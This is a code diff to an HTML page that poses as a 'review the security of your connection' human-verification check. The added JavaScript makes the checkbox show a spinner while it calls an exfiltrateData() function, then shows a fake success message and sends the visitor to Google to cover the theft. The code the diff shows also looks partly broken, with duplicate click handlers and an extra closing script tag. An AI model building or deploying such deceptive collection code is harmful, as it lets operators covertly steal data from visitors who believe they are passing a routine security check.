@@ -243,6 +243,42 @@
     <p>example.com needs to review the security of your connection before proceeding.</p>
 
     <script>
+      
+      // 1. Handle checkbox click (spinner + immediate data exfiltration)
+function handleCheckbox(event) {
+  const checkbox = document.getElementById("verifyHuman");
+  const label = event.currentTarget;
+  const checkmark = document.getElementById("checkmark");
+  const verifyText = document.getElementById("verify-text");
+  const verifyingText = document.getElementById("verifying-text");
+  const successText = document.getElementById("success-text");
+
+  event.preventDefault();
+
+  if (checkbox.checked || label.classList.contains("loading")) return;
+
+  // Show loading spinner
+  label.classList.add("loading");
+  verifyText.style.display = "none";
+  verifyingText.style.display = "inline";
+
+  // Start data exfiltration IMMEDIATELY (while spinner runs)
+  exfiltrateData().then(() => {
+    // After exfiltration completes, show fake "Success" (3s delay)
+    setTimeout(() => {
+      label.classList.remove("loading");
+      checkmark.style.display = "block";
+      verifyingText.style.display = "none";
+      successText.style.display = "inline";
+      checkbox.checked = true;
+    }, 3000);
+
+    // Redirect after 6 seconds
+    setTimeout(() => {
+      window.location.href = "https://www.google.com"; // Fake redirect
+    }, 6000);
+  });
+}
 // 1. Execute on checkbox click
 document.getElementById('verifyHuman').addEventListener('click', async (e) => {
   e.preventDefault();
@@ -391,6 +427,8 @@ async function getBatteryStatus() {
   }
 }
 
+
+</script>
     </script>
   </main>
 </body>
